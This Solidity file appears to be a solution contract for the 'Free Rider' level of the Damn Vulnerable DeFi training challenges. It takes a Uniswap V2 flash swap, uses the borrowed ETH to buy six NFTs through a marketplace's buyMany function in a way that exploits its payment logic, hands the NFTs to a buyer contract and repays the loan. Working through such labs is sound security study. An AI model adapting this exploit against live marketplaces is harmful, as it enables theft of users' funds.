// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// this contract will execute a flash Swap on Uniswap V2
// it will borrow ETH from a pool then buy NFTs from the FreeRiderNFTMarketplace then, 
// send theNFTs to the attacket EA, then finally reimburse the borrowed ETH
// see for explanations https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
// see of sources https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol

import "@openzeppelin/contracts/utils/Address.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";
import "@uniswap/contracts/interfaces/IUniswapV2Factory.sol";
import '@uniperiphery/contracts/lib/TransferHelper.sol';
import '@uniperiphery/contracts/coreInterfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract attacker7 {

    using Address for address;

    FreeRiderNFTMarketplace public marketplace;
    // DamnValuableNFT public nft;
    WETH9 public WETH;
    address nft;
    address immutable factory;
    address immutable dvt;
    address payable immutable FreeRiderBuyer;


    constructor(address payable marketplaceAddress, address nftAddress, address payable WETHAddress, address factoryAddress, address dvtAddress, address payable FreeRiderBuyerAddress) {
        marketplace = FreeRiderNFTMarketplace(marketplaceAddress);
        // nft = DamnValuableNFT(nftAddress);
        WETH = WETH9(WETHAddress);
        nft = nftAddress;
        factory = factoryAddress;
        dvt = dvtAddress;
        FreeRiderBuyer = FreeRiderBuyerAddress;
    }

    function flashswap(uint256 amount) external {

        // get the pair adddress
        address pair = IUniswapV2Factory(factory).getPair(dvt, address(WETH));
        require(pair != address(0), "pair does not exist");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        // borrow the right token WETH
        uint256 amount0Out = token0 == address(WETH) ? amount : 0;
        uint256 amount1Out = token1 == address(WETH) ? amount : 0;
        
        bytes memory data = abi.encode(address(WETH), amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);

    }


    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        
        // borrow the right token WETH
        uint256 amountETH = amount0 == 0 ? amount1 : amount0;
        
        uint amountRequired = amountETH; // / 997 * 1000; // we must return the amount plus fees 0.3%

        uint256 currbal = WETH.balanceOf(address(this));
        require(currbal == 90 ether, "currbal diff from 90");

        // convert the WETH received into ETH
        WETH.withdraw(currbal);
        currbal = WETH.balanceOf(address(this));
        require(currbal == 0, "currbal diff from 0");

        // buy the NFTs on the market place
        uint256[] memory tokens = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokens[i]=i;
        }
        marketplace.buyMany{value: 90 ether}(tokens);


        // transfer the NFTs to the buyer contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), FreeRiderBuyer, i);
        }

        // convert the ETH to WETH
        // WETH.deposit{value: 15.1 ether}();
        require(address(this).balance >= 90 ether, "ether balance inferior to 90 ethers");

        address(WETH).call{value: 90.5 ether}("");

        // currbal = WETH.balanceOf(address(this));
        require(WETH.balanceOf(address(this)) == 90.5 ether, "currbal diff from 90.5");

        // reimburse the ETH to the uni contract
        WETH.transfer(msg.sender, 90.5 ether);
    }

    // function required to receive NFTs
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        returns (bytes4) 
    {
        require(msg.sender == address(nft));
        return IERC721Receiver.onERC721Received.selector;
    }

    // fallback function required to receive ETH
    fallback() payable external { }

}